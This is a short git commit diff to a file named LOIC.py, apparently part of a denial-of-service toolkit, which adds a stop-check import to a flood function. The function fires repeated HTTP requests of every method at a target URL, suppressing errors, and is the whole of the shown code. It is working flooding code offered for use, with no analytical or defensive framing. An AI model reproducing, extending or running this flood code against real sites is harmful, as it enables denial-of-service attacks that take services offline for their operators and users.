47ee35970704a748311b033cb1484230be7ee72d
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2024-05-11 13:08:18 +0700

    Update LOIC.py

--- methods/LOIC.py
+++ methods/LOIC.py
@@ -1,7 +1,9 @@
 import requests,threading,sys
+from MODEL.data import read
 
 def flood(tar,time):
     for _ in range(time):
+     if read() == True:break
      try:[requests.Session().send(requests.Request(method=a,url=tar).prepare()) for a in ['GET','POST','PUT','PATCH','OPTIONS','DELETE','HEAD','TRACE','CONNECT']]
      except:pass
 
